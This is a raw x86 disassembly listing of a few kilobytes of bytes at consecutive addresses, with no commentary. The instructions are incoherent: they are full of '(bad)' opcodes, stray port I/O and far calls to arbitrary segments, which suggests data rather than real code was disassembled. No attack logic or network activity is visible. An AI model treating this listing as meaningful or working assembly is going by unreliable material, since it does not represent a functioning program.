  43fa88:	cmp    DWORD PTR [ebp+edi*2-0x43],ecx
  43fa8c:	fistp  DWORD PTR [ebp+0x4ac6edc7]
  43fa92:	mov    ds:0x9a76e2ff,eax
  43fa97:	jne    0x43fa64
  43fa99:	jge    0x43fa8f
  43fa9b:	push   ds
  43fa9c:	pop    es
  43fa9d:	inc    esi
  43fa9e:	out    0x59,eax
  43faa0:	pop    edi
  43faa1:	or     ecx,DWORD PTR [ebx+0x72b916dc]
  43faa7:	out    dx,eax
  43faa8:	mov    ds:0xb5306657,al
  43faad:	jmp    0x43fab4
  43faaf:	les    edx,FWORD PTR [ecx+0x56d05a69]
  43fab5:	fbstp  TBYTE PTR [eax+0x520e4ba7]
  43fabb:	out    0xf5,eax
  43fabd:	adc    DWORD PTR [esi+0x1e],0xffffffbc
  43fac1:	lock addr16 jno 0x43fb12
  43fac5:	jmp    0x43fac8
  43fac7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43fac8:	adc    DWORD PTR [esi],0x8406a76d
  43face:	pop    eax
  43facf:	nop
  43fad0:	adc    edx,DWORD PTR [edi+0x50b2f2c0]
  43fad6:	pop    esi
  43fad7:	mov    edi,0xa156094a
  43fadc:	das    
  43fadd:	or     edx,DWORD PTR [edi-0x3e]
  43fae0:	push   es
  43fae1:	jb     0x43fb15
  43fae3:	jns    0x43fb53
  43fae5:	cli    
  43fae6:	or     dl,ch
  43fae8:	mov    dl,0xb4
  43faea:	(bad)
  43faee:	outs   dx,BYTE PTR ds:[esi]
  43faef:	sbb    BYTE PTR [edi+0xedf760b],0xf2
  43faf6:	(bad)  
  43faf7:	fsub   st,st(3)
  43faf9:	ficomp WORD PTR [edx-0x5e24ba19]
  43faff:	nop
  43fb00:	daa    
  43fb01:	xor    DWORD PTR [ebp-0x353805a],edi
  43fb07:	pusha  
  43fb08:	jo     0x43fb4d
  43fb0a:	xor    eax,0x9a7ae847
  43fb0f:	add    eax,0xd77394bd
  43fb14:	into   
  43fb15:	pop    ecx
  43fb16:	xlat   BYTE PTR ds:[ebx]
  43fb17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43fb18:	icebp  
  43fb19:	push   ds
  43fb1a:	add    ebx,DWORD PTR [esi+0x71f16630]
  43fb20:	mov    dl,0x79
  43fb22:	sub    al,0xc9
  43fb24:	jecxz  0x43fb6f
  43fb26:	loope  0x43fac3
  43fb28:	(bad)  
  43fb29:	or     edi,DWORD PTR [edi+0x573dfa17]
  43fb2f:	les    edi,FWORD PTR [ecx]
  43fb31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43fb32:	call   0x3a50:0x9cdf8ac1
  43fb39:	xchg   edx,eax
  43fb3a:	into   
  43fb3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43fb3c:	dec    ecx
  43fb3d:	or     DWORD PTR [ebp+0x274fedc9],0xaa9b95cf
  43fb47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43fb48:	mov    WORD PTR [eax+0x19],ds
  43fb4b:	pop    edi
  43fb4c:	or     ebx,DWORD PTR cs:[edx]
  43fb4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43fb50:	mov    ebx,0xe5762cf6
  43fb55:	test   al,0x9a
  43fb57:	mov    ch,0x3c
  43fb59:	inc    edi
  43fb5a:	sahf   
  43fb5b:	adc    eax,0xa615a586
  43fb60:	iret   
  43fb61:	add    ebx,ecx
  43fb63:	retf   0x2d67
  43fb66:	mov    cl,0x73
  43fb68:	inc    ecx
  43fb69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43fb6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43fb6b:	and    eax,0x10c29729
  43fb70:	jne    0x43fb40
  43fb72:	jg     0x43fba9
  43fb74:	push   edx
  43fb75:	pop    ebx
  43fb76:	sub    bh,BYTE PTR [esi-0x4a84f487]
  43fb7c:	in     eax,0x46
  43fb7e:	and    dl,BYTE PTR [esi+0x55]
  43fb81:	daa    
  43fb82:	cli    
  43fb83:	xor    dl,0x20
  43fb86:	mov    esi,0x6a0b8ded
  43fb8b:	jle    0x43fb40
  43fb8d:	xchg   edi,eax
  43fb8e:	ins    DWORD PTR es:[edi],dx
  43fb8f:	inc    ebx
  43fb90:	adc    DWORD PTR [edi-0x186c5c6c],edi
  43fb96:	jns    0x43fbff
  43fb98:	push   ebx
  43fb99:	pop    ecx
  43fb9a:	xchg   esi,eax
  43fb9b:	std    
  43fb9c:	cmc    
  43fb9d:	pop    ss
  43fb9e:	imul   esp,DWORD PTR [eax+ebp*1],0xffffff8c
  43fba2:	out    dx,al
  43fba3:	mov    ebx,?
  43fba5:	jmp    0x43fc1e
  43fba7:	call   FWORD PTR [eax-0x5d]
  43fbaa:	ja     0x43fc27
  43fbac:	rcr    ch,1
  43fbae:	call   0x9985:0xdff2fd34
  43fbb5:	imul   edx,DWORD PTR [edx-0x60],0xffffffc8
  43fbb9:	shl    BYTE PTR [ecx-0x49],1
  43fbbc:	mov    esp,0xdd1490b
  43fbc1:	int3   
  43fbc2:	call   0xfa51:0x98b053a2
  43fbc9:	sub    bh,BYTE PTR [edi]
  43fbcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43fbcc:	cwde   
  43fbcd:	mov    ebx,0x78c2d048
  43fbd2:	or     bl,BYTE PTR [eax-0x62]
  43fbd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43fbd6:	fwait
  43fbd7:	xor    ch,BYTE PTR fs:0x356ae49c
  43fbde:	inc    edx
  43fbdf:	add    cl,bh
  43fbe1:	or     esp,DWORD PTR [esi]
  43fbe3:	ss push edi
  43fbe5:	stc    
  43fbe6:	xchg   BYTE PTR [ecx+edi*8+0x7484a6d1],ah
  43fbed:	or     ebp,DWORD PTR [eax+edx*1-0x18]
  43fbf1:	into   
  43fbf2:	lea    edi,[eax]
  43fbf4:	mov    bh,0xa
  43fbf6:	pop    ebx
  43fbf7:	fwait
  43fbf8:	arpl   WORD PTR [ecx],cx
  43fbfa:	jl     0x43fc53
  43fbfc:	fs jecxz 0x43fbf6
  43fbff:	je     0x43fbb6
  43fc01:	pop    esi
  43fc02:	jne    0x43fc1b
  43fc04:	das    
  43fc05:	adc    DWORD PTR [edx],edi
  43fc07:	push   ebp
  43fc08:	mov    BYTE PTR [ebx-0x18],0xa7
  43fc0c:	outs   dx,BYTE PTR ds:[esi]
  43fc0d:	call   0x4918086f
  43fc12:	mov    edi,DWORD PTR [edx-0x3b416b4e]
  43fc18:	pop    ecx
  43fc19:	daa    
  43fc1a:	inc    ebp
  43fc1b:	lahf   
  43fc1c:	push   eax
  43fc1d:	or     eax,DWORD PTR [edx]
  43fc1f:	aad    0x9a
  43fc21:	jmp    0x9e9d:0x36de366d
  43fc28:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43fc2a:	cmc    
  43fc2b:	and    ah,BYTE PTR [edx-0x34]
  43fc2e:	or     eax,ebx
  43fc30:	push   ebp
  43fc31:	add    eax,0x6eb6b808
  43fc36:	jp     0x43fc53
  43fc38:	rcr    DWORD PTR [edx],0xc1
  43fc3b:	div    BYTE PTR [edx+0x51c06589]
  43fc41:	xor    DWORD PTR [ebx+0x53],esi
  43fc44:	test   BYTE PTR [ebx],cl
  43fc46:	xchg   ebx,ebx
  43fc48:	push   ebp
  43fc49:	cmp    DWORD PTR [edi],0x5f
  43fc4c:	stc    
  43fc4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43fc4e:	call   0x53e4:0xf8c6d9e5
  43fc55:	jp     0x43fc0e
  43fc57:	pop    ds
  43fc58:	mov    cs,WORD PTR [ebx]
  43fc5a:	jge    0x43fc44
  43fc5c:	cmp    eax,0x14093193
  43fc61:	(bad)  
  43fc62:	jmp    0x7568af55
  43fc67:	fmul   DWORD PTR [esi-0xd95749e]
  43fc6d:	imul   DWORD PTR [ebx+0x41f7eba7]
  43fc73:	mov    ebx,DWORD PTR [esi+ecx*2+0x39b22247]
  43fc7a:	outs   dx,DWORD PTR ds:[esi]
  43fc7b:	mov    ebp,0xcd10acff
  43fc80:	mov    esi,0x322e2830
  43fc85:	sub    al,0x2b
  43fc87:	xor    ebx,DWORD PTR [edx+0xf]
  43fc8a:	popf   
  43fc8b:	shl    DWORD PTR [edx+0x4eae1e77],1
  43fc91:	into   
  43fc92:	fucomp st(4)
  43fc94:	test   BYTE PTR [ebx],cl
  43fc96:	fcom   DWORD PTR [eax+0x53b7190a]
  43fc9c:	dec    edi
  43fc9d:	push   edi
  43fc9e:	call   0xb4d1:0xa9d8179d
  43fca5:	(bad)  
  43fca6:	shl    BYTE PTR [edi-0x79c30883],cl
  43fcac:	test   BYTE PTR [edx-0x55],cl
  43fcaf:	fs mov bl,0x5b
  43fcb2:	jp     0x43fc9b
  43fcb4:	sub    al,0xb1
  43fcb6:	or     DWORD PTR [esi-0x583fee3e],ebp
  43fcbc:	loope  0x43fd15
  43fcbe:	aas    
  43fcbf:	(bad)  
  43fcc0:	in     eax,dx
  43fcc1:	mov    WORD PTR [ecx-0x7e],?
  43fcc4:	scas   eax,DWORD PTR es:[edi]
  43fcc5:	cmp    DWORD PTR [edx+0x6387300a],ebp
  43fccb:	daa    
  43fccc:	inc    eax
  43fccd:	dec    ebx
  43fcce:	or     al,0x4d
  43fcd0:	or     ecx,DWORD PTR [ebx]
  43fcd2:	int3   
  43fcd3:	out    dx,al
  43fcd4:	mov    esp,0xa7353f0c
  43fcd9:	cs call 0xab25:0xdde2139c
  43fce1:	imul   BYTE PTR [esi-0x7361c859]
  43fce7:	icebp  
  43fce8:	push   ds
  43fce9:	jl     0x43fd39
  43fceb:	retf   
  43fcec:	mov    dl,0x5b
  43fcee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43fcef:	ficom  DWORD PTR [esi+eax*1]
  43fcf2:	mov    ds:0xaa79018e,al
  43fcf7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43fcf8:	sbb    eax,edx
  43fcfa:	xor    eax,0x4e8708ea
  43fcff:	xchg   esp,eax
  43fd00:	mov    ebx,0xf69e14bc
  43fd05:	mov    ecx,DWORD PTR [ebx]
  43fd07:	in     al,dx
  43fd08:	pusha  
  43fd09:	push   0xffffffab
  43fd0b:	mov    al,ds:0xbe601d18
  43fd10:	xchg   esi,eax
  43fd11:	cmp    ebp,edx
  43fd13:	lods   al,BYTE PTR ds:[esi]
  43fd14:	pushf  
  43fd15:	pusha  
  43fd16:	cli    
  43fd17:	push   esp
  43fd18:	(bad)  
  43fd19:	mov    dl,0xf5
  43fd1b:	aaa    
  43fd1c:	pop    ds
  43fd1d:	or     ecx,DWORD PTR [eax]
  43fd1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43fd20:	loopne 0x43fcb0
  43fd22:	xor    bl,BYTE PTR [eax-0x24]
  43fd25:	inc    esp
  43fd26:	in     eax,0xe9
  43fd28:	mov    dl,0x41
  43fd2a:	xlat   BYTE PTR ds:[ebx]
  43fd2b:	shl    BYTE PTR [edi-0x4955ff39],1
  43fd31:	or     ecx,DWORD PTR [esi-0x29]
  43fd34:	in     al,dx
  43fd35:	loop   0x43fdb1
  43fd37:	pushf  
  43fd38:	imul   ebp,DWORD PTR [ecx],0xffffff8d
  43fd3b:	jl     0x43fdb2
  43fd3d:	mov    bh,0x9a
  43fd3f:	mov    ch,0xb5
  43fd41:	and    BYTE PTR [eax-0x41fbc633],cl
  43fd47:	pop    esp
  43fd48:	inc    ebp
  43fd49:	pop    esp
  43fd4a:	cmp    ch,BYTE PTR [ebx+ecx*4-0x2a]
  43fd4e:	xchg   ebp,eax
  43fd4f:	cdq    
  43fd50:	mov    dl,0xce
  43fd52:	je     0x43fcde
  43fd54:	bound  eax,QWORD PTR [edi-0x1a]
  43fd57:	xor    eax,0x5c250b2a
  43fd5c:	(bad)  
  43fd5e:	fild   WORD PTR [ecx-0x4f62724a]
  43fd64:	(bad)
  43fd67:	adc    DWORD PTR [ebx-0x25],0xfffffff8
  43fd6b:	add    DWORD PTR [edx+0xa],ecx
  43fd6e:	popf   
  43fd6f:	pop    ds
  43fd70:	data16 or bh,BYTE PTR [edx]
  43fd73:	ss inc ecx
  43fd75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43fd76:	jmp    0xc9de:0x5dcbff41
  43fd7d:	hlt    
  43fd7e:	fwait
  43fd7f:	xchg   edi,eax
  43fd80:	cmp    bh,BYTE PTR [ecx+eax*8]
  43fd83:	sub    ebx,ebp
  43fd85:	cmp    DWORD PTR [esi+0x17],ebx
  43fd88:	sbb    DWORD PTR [ebx],ecx
  43fd8a:	adc    BYTE PTR [edx+0x8578b98],0xb6
  43fd91:	adc    al,0x84
  43fd93:	mov    edx,0x1f47debe
  43fd98:	mov    esp,0x1ce76bff
  43fd9d:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  43fd9f:	adc    ebx,DWORD PTR [eax-0x467671f5]
  43fda5:	push   esi
  43fda6:	push   esp
  43fda7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43fda8:	jmp    0x9732:0x919b64
  43fdaf:	push   ebx
  43fdb0:	nop
  43fdb1:	adc    edx,edi
  43fdb3:	pop    esp
  43fdb4:	imul   ecx,DWORD PTR [ebx],0xf0d8371a
  43fdba:	(bad)  
  43fdbb:	(bad)  
  43fdbc:	mov    eax,0x60299ab0
  43fdc1:	or     BYTE PTR ds:0x92c5379d,ah
  43fdc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43fdc8:	ret    0x8d30
  43fdcb:	shr    DWORD PTR [ecx+0x49],1
  43fdce:	sbb    DWORD PTR [edx],ecx
  43fdd0:	mov    dl,0x7c
  43fdd2:	dec    esp
  43fdd3:	fiadd  WORD PTR [edx-0x639a0d94]
  43fdd9:	or     ebp,DWORD PTR [eax+0x63]
  43fddc:	xchg   DWORD PTR [ebp+0x5f],ecx
  43fddf:	punpckhwd mm1,QWORD PTR [edi+0x23b238e0]
  43fde6:	inc    esp
  43fde7:	scas   eax,DWORD PTR es:[edi]
  43fde8:	mov    ebx,0xfa2ce588
  43fded:	adc    eax,0xb7719488
  43fdf2:	sbb    dh,BYTE PTR [eax+0xd1524d4]
  43fdf8:	(bad)  [edx]
  43fdfa:	cdq    
  43fdfb:	sbb    esi,ebp
  43fdfd:	push   esi
  43fdfe:	outs   dx,DWORD PTR ds:[esi]
  43fdff:	fimul  WORD PTR [ebx]
  43fe01:	fwait
  43fe02:	int    0x15
  43fe04:	adc    DWORD PTR [ebx],ecx
  43fe06:	scas   al,BYTE PTR es:[edi]
  43fe07:	jecxz  0x43fe57
  43fe09:	adc    al,0xc4
  43fe0b:	mov    DWORD PTR [edi+ebx*8-0x74fc815c],eax
  43fe12:	push   0xffffffe1
  43fe14:	or     DWORD PTR [esi],esi
  43fe16:	idiv   BYTE PTR [ecx+0x8]
  43fe19:	adc    eax,0x8b36808c
  43fe1e:	(bad)  
  43fe1f:	pop    edi
  43fe20:	fld    DWORD PTR [ebp-0x2b4dac57]
  43fe26:	jg     0x43fe15
  43fe28:	sbb    esp,DWORD PTR [edi-0x7]
  43fe2b:	mov    bl,0xf9
  43fe2d:	or     edx,DWORD PTR [edx]
  43fe2f:	pop    ss
  43fe30:	or     eax,0xb1b83082
  43fe35:	sub    DWORD PTR [edx-0x34e6362c],ebx
  43fe3b:	ror    al,0xca
  43fe3e:	pop    es
  43fe3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43fe40:	xchg   DWORD PTR [eax+0x3c],edx
  43fe43:	fisttp DWORD PTR [esi]
  43fe45:	sub    al,0x63
  43fe47:	out    0xb2,al
  43fe49:	cld    
  43fe4a:	adc    BYTE PTR [ebp-0x27],0x76
  43fe4e:	sbb    al,0xe
  43fe50:	inc    ebx
  43fe51:	out    dx,al
  43fe52:	push   esi
  43fe53:	je     0x43fdf0
  43fe55:	neg    DWORD PTR [edi]
  43fe57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43fe58:	adc    edi,DWORD PTR ds:0xd264a4ff
  43fe5e:	xor    eax,0xffefe04
  43fe63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43fe64:	dec    eax
  43fe65:	cs add dl,ah
  43fe68:	ins    BYTE PTR es:[edi],dx
  43fe69:	(bad)  
  43fe6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43fe6c:	je     0x43febe
  43fe6e:	into   
  43fe6f:	cmp    esp,DWORD PTR [edx-0x5a]
  43fe72:	not    ebx
  43fe74:	mov    dl,0x32
  43fe76:	fcom   QWORD PTR [ebx]
  43fe78:	repnz xchg ebx,eax
  43fe7a:	out    0xb3,eax
  43fe7c:	mov    ds:0x7209c0b,eax
  43fe81:	pop    ebx
  43fe82:	shl    DWORD PTR [edx],cl
  43fe84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43fe85:	cli    
  43fe86:	jmp    0xaedf86d4
  43fe8b:	daa    
  43fe8c:	mov    dh,0x86
  43fe8e:	jle    0x43fe84
  43fe90:	nop
  43fe91:	add    eax,0xe101a398
  43fe96:	cld    
  43fe97:	cmp    dl,BYTE PTR [ebx+ecx*8-0x1f0b25ad]
  43fe9e:	call   0x4d6f:0xffe50f9d
  43fea5:	cdq    
  43fea6:	pop    ebp
  43fea7:	sub    DWORD PTR [edx],0x4b
  43feaa:	int    0xa7
  43feac:	or     dh,dl
  43feae:	push   eax
  43feaf:	pushf  
  43feb0:	xor    ax,0x2f9a
  43feb4:	inc    edx
  43feb5:	mov    bh,BYTE PTR [eax+0x43f0da5f]
  43febb:	aam    0xa4
  43febd:	or     ebx,DWORD PTR [eax+ecx*1]
  43fec0:	pushf  
  43fec1:	aas    
  43fec2:	adc    BYTE PTR [edi+0x5b],ah
  43fec5:	neg    BYTE PTR [edx+0x15a6c1a]
  43fecb:	xchg   edx,eax
  43fecc:	rol    eax,0xd5
  43fecf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43fed0:	cmp    ebp,0x89f278f7
  43fed6:	adc    DWORD PTR [edx],ebp
  43fed8:	mov    dl,0x16
  43feda:	mov    ds:0xa1edd4d5,eax
  43fedf:	into   
  43fee0:	enter  0x8eb,0xa7
  43fee4:	lahf   
  43fee5:	mov    ch,0x6d
  43fee7:	or     dh,BYTE PTR [edi]
  43fee9:	sub    dl,al
  43feeb:	push   0xffffffb3
  43feed:	xor    DWORD PTR [ebp+ebx*2-0x7e34eb97],esi
  43fef4:	mov    ebx,cs
  43fef6:	mov    ah,0x3
  43fef8:	data16 neg BYTE PTR [edx-0x3a0a2b71]
  43feff:	scas   al,BYTE PTR es:[edi]
  43ff00:	repnz xchg edi,eax
  43ff02:	add    esp,DWORD PTR [edi-0xdcedb99]
  43ff08:	push   edx
  43ff09:	(bad)  
  43ff0a:	in     eax,0x5
  43ff0c:	mov    dl,0x63
  43ff0e:	je     0x43ff84
  43ff10:	and    eax,0x65b6ea0d
  43ff15:	or     DWORD PTR [ebx+0x26feba8c],edi
  43ff1b:	pop    ds
  43ff1c:	shr    ch,cl
  43ff1e:	icebp  
  43ff1f:	lss    ecx,FWORD PTR [ecx-0x7507fb3b]
  43ff26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43ff27:	inc    BYTE PTR [ebx+0xf]
  43ff2a:	jno    0x43ff16
  43ff2c:	push   edi
  43ff2d:	pop    ecx
  43ff2e:	and    esp,DWORD PTR [ebx+edi*4]
  43ff31:	sbb    al,0x4a
  43ff33:	shl    dl,1
  43ff35:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43ff37:	inc    eax
  43ff38:	mov    WORD PTR [ebx+0x65678a0],cs
  43ff3e:	sar    DWORD PTR [edx+eax*4],0x19
  43ff42:	leave  
  43ff43:	jb     0x43ff2a
  43ff45:	pop    ss
  43ff46:	add    BYTE PTR [edi-0x71d03961],ah
  43ff4c:	nop
  43ff4d:	je     0x43fee0
  43ff4f:	pushf  
  43ff50:	in     eax,dx
  43ff51:	jecxz  0x43ff09
  43ff53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43ff54:	outs   dx,BYTE PTR ds:[esi]
  43ff55:	sbb    al,dh
  43ff57:	je     0x43ffb9
  43ff59:	or     esp,DWORD PTR [ecx+0x3b]
  43ff5c:	lock sti 
  43ff5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43ff5f:	and    DWORD PTR [ebx],esi
  43ff61:	inc    esi
  43ff62:	mov    esp,0x9913fb73
  43ff67:	mov    eax,ds:0x4e34cb5d
  43ff6c:	not    cl
  43ff6e:	push   esi
  43ff6f:	or     edi,DWORD PTR [ebx+ecx*1-0x65]
  43ff73:	adc    eax,0xc3abb849
  43ff78:	dec    eax
  43ff79:	fistp  WORD PTR [edx-0x1d98d69e]
  43ff7f:	mov    dh,0xd1
  43ff81:	sbb    BYTE PTR ss:[esi+0x34b0aa],ch
  43ff88:	mov    cl,0x97
  43ff8a:	inc    ecx
  43ff8b:	(bad)  
  43ff8c:	xor    ch,ah
  43ff8e:	dec    ecx
  43ff8f:	scas   eax,DWORD PTR es:[edi]
  43ff90:	mov    dl,0xc7
  43ff92:	pop    es
  43ff93:	push   cs
  43ff94:	sub    esi,DWORD PTR [ebp-0x14]
  43ff97:	mov    edi,0x8db10b0e
  43ff9c:	sbb    eax,0x47b73e2b
  43ffa1:	addr16 call 0xdd28b381
  43ffa7:	adc    BYTE PTR [edi],dl
  43ffa9:	imul   esp,DWORD PTR [ebx+0x65f932b8],0x691b7ac3
  43ffb3:	inc    ecx
  43ffb4:	inc    ecx
  43ffb5:	retf   
  43ffb6:	pop    ebx
  43ffb7:	sbb    BYTE PTR [edx+0x4206867e],dh
  43ffbd:	aas    
  43ffbe:	lds    ebx,FWORD PTR [ebx-0x11]
  43ffc1:	or     eax,DWORD PTR [esi+0x5e]
  43ffc4:	scas   eax,DWORD PTR es:[edi]
  43ffc5:	cmp    eax,0xb372b28e
  43ffca:	fwait
  43ffcb:	xor    ch,ah
  43ffcd:	mov    ah,0xc
  43ffcf:	push   0x17a58c05
  43ffd4:	mov    bh,0x47
  43ffd6:	call   0x9712:0x5b5911e1
  43ffdd:	lea    ecx,[esi-0x58]
  43ffe0:	in     al,0x4a
  43ffe2:	popf   
  43ffe3:	sub    al,0x72
  43ffe5:	lods   eax,DWORD PTR ds:[esi]
  43ffe6:	xchg   ebp,eax
  43ffe7:	or     eax,0x229a0fae
  43ffec:	mov    al,ds:0x549ee8e4
  43fff1:	into   
  43fff2:	stos   BYTE PTR es:[edi],al
  43fff3:	mov    ecx,0xe780b781
  43fff8:	cmp    ebx,DWORD PTR [eax+eiz*1-0x7f]
  43fffc:	jp     0x440075
  43fffe:	call   0xf8e5:0x15f5b134
  440005:	push   ss
  440006:	retf   0xdc47
  440009:	pop    ss
  44000a:	pusha  
  44000b:	out    0xc1,al
  44000d:	dec    eax
  44000e:	sub    al,0xee
  440010:	jg     0x43ffec
  440012:	push   0x46
  440014:	push   ecx
  440015:	adc    eax,0x6a0519a
  44001a:	mov    dl,0x27
  44001c:	push   esi
  44001d:	rcr    esp,0xa7
  440020:	sahf   
  440021:	xor    al,0x55
  440023:	xchg   ecx,eax
  440024:	mov    BYTE PTR [ecx],0xc6
  440027:	ds mov dl,0xb4
  44002a:	and    BYTE PTR [esi],0xf0
  44002d:	ret    
  44002e:	sbb    DWORD PTR [ecx],esi
  440030:	xchg   DWORD PTR [ebx],ecx
  440032:	adc    bl,BYTE PTR [ecx+0x50]
  440035:	mov    cl,0x94
  440037:	xchg   ebx,eax
  440038:	lea    ebp,[esi+0x76fb1fb6]
  44003e:	popf   
  44003f:	je     0x44009e
  440041:	sahf   
  440042:	stos   BYTE PTR es:[edi],al
  440043:	mov    al,0xe6
  440045:	stos   BYTE PTR es:[edi],al
  440046:	jno    0x44000f
  440048:	js     0x440045
  44004a:	fst    DWORD PTR [edx-0x15]
  44004d:	rcr    BYTE PTR [edx-0x17a2ce4],cl
  440053:	mov    DWORD PTR [ebp+ebp*2+0x6e],ebx
  440057:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  440058:	or     al,0xf5
  44005a:	into   
  44005b:	cdq    
  44005c:	fdiv   QWORD PTR [edi+0x3]
  44005f:	mov    edi,0xc215ff36
  440064:	mov    ebp,0xb5d6cc94
  440069:	call   0xec1131b0
  44006e:	aaa    
  44006f:	aad    0xa1
  440071:	or     BYTE PTR [esi+ebx*4+0x7e],bh
  440075:	push   ebp
  440076:	sub    dh,BYTE PTR [ebp+0x15b3b552]
  44007c:	mov    esi,DWORD PTR ds:0x711ca4e5
  440082:	popa   
  440083:	outs   dx,DWORD PTR ds:[esi]
  440084:	pop    ecx
  440085:	ror    esi,cl
  440087:	ror    BYTE PTR [edi+0xc],1
  44008a:	int3   
  44008b:	dec    eax
  44008c:	mov    esp,DWORD PTR [esi]
  44008e:	xchg   esp,eax
  44008f:	addr16 adc al,0xf2
  440092:	push   ds
  440093:	inc    edi
  440094:	mov    ecx,0xc12c6c3d
  440099:	or     eax,DWORD PTR [edx+0x5b]
  44009c:	out    0x7a,eax
  44009e:	jb     0x440038
  4400a0:	xchg   ebp,eax
  4400a1:	out    0x9a,al
  4400a3:	and    ch,0x34
  4400a6:	mov    dl,0x18
  4400a8:	or     al,0xdc
  4400aa:	call   0x17b2:0xc64ff833
  4400b1:	jle    0x44006f
  4400b3:	popf   
  4400b4:	push   ds
  4400b5:	int    0x18
  4400b7:	pop    ss
  4400b8:	(bad)  
  4400b9:	jnp    0x44011d
  4400bb:	mov    cl,0xf2
  4400bd:	mov    esp,0xc68dbcde
  4400c2:	jnp    0x44007f
  4400c4:	fidiv  WORD PTR [ebx]
  4400c6:	cwde   
  4400c7:	pushf  
  4400c8:	fcomp  st(4)
  4400ca:	fisub  DWORD PTR [edi+0x23]
  4400cd:	cmp    dh,BYTE PTR [edi-0x47]
  4400d0:	mov    edi,0x77671cc8
  4400d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4400d6:	test   DWORD PTR [edx-0x3e652a03],eax
  4400dc:	fnop   
  4400de:	jb     0x44006a
  4400e0:	(bad)  
  4400e1:	push   0xffffffc1
  4400e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4400e4:	xor    DWORD PTR [edx+0x77],0x25f789d
  4400eb:	dec    eax
  4400ec:	xlat   BYTE PTR ds:[ebx]
  4400ed:	mov    ds:0xaa40689a,al
  4400f2:	int3   
  4400f3:	adc    DWORD PTR [esi+0x4e506519],ebx
  4400f9:	in     eax,dx
  4400fa:	rcr    BYTE PTR [ecx+0x5e],cl
  4400fd:	add    eax,0x56e0d40d
  440102:	cmp    ah,BYTE PTR [eax]
  440104:	xchg   ecx,eax
  440105:	std    
  440106:	fsubp  st(4),st
  440108:	mov    dl,0xc3
  44010a:	jo     0x44016e
  44010c:	or     DWORD PTR [ebx],ebp
  44010e:	mov    cl,0x5b
  440110:	(bad)  
  440111:	sbb    al,0xb
  440113:	call   0xb7ee:0x27bc17a6
  44011a:	out    0x63,eax
  44011c:	sub    bh,bl
  44011e:	call   0xa17e:0x4062a2ae
  440125:	jo     0x4400c7
  440127:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440128:	sar    DWORD PTR [esi+edi*2],cl
  44012b:	test   BYTE PTR [ecx],bh
  44012d:	pop    edx
  44012e:	mov    ds:0x4d35b211,al
  440133:	ret    
  440134:	sub    bl,BYTE PTR [ebx]
  440136:	retf   0x4794
  440139:	stos   DWORD PTR es:[edi],eax
  44013a:	dec    ebp
  44013b:	jecxz  0x44014f
  44013d:	or     esp,DWORD PTR [ebx+ebx*1+0x78]
  440141:	sub    BYTE PTR ds:0x98cb9a66,ah
  440147:	xor    BYTE PTR [esi-0x47],bl
  44014a:	sub    eax,0xd2c8bdc6
  44014f:	pop    edi
  440150:	or     ebp,DWORD PTR [ebp+esi*8+0x783665d3]
  440157:	mov    ah,0x32
  440159:	out    dx,eax
  44015a:	add    dh,BYTE PTR [ebx]
  44015c:	mov    bl,0xb3
  44015e:	shl    edx,1
  440160:	mov    dl,0x48
  440162:	and    BYTE PTR [ebx-0x29f37e88],0xe2
  440169:	or     ebp,DWORD PTR [edx]
  44016b:	addr16 pusha 
  44016d:	adc    BYTE PTR [edx+0x4e],bh
  440170:	call   0xaa61:0xdc549aaa
  440177:	aas    
  440178:	and    eax,0x7ca7da4f
  44017d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44017e:	fild   DWORD PTR [ebx]
  440180:	push   eax
  440181:	ins    BYTE PTR es:[edi],dx
  440182:	imul   ebx,esi,0xffffffb2
  440185:	or     BYTE PTR [ebp+0x354268dc],bh
  44018b:	xchg   ebx,eax
  44018c:	inc    ecx
  44018d:	or     esi,DWORD PTR [eax+0x539d7a60]
  440193:	xchg   edx,eax
  440194:	arpl   WORD PTR [eax+0x6c],bx
  440197:	sub    dh,BYTE PTR [ecx-0x5fccc9eb]
  44019d:	fild   WORD PTR [ecx+0x4e03f95e]
  4401a3:	jge    0x4401f0
  4401a5:	or     eax,DWORD PTR [ebx+0x1a]
  4401a8:	shl    DWORD PTR [ebp-0x52],1
  4401ab:	out    0xc7,eax
  4401ad:	cmp    BYTE PTR [esi+0x558b2637],ah
  4401b3:	lock enter 0x59b7,0x49
  4401b8:	push   ebp
  4401b9:	icebp  
  4401ba:	pop    esp
  4401bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4401bc:	test   al,0xc9
  4401be:	pop    esi
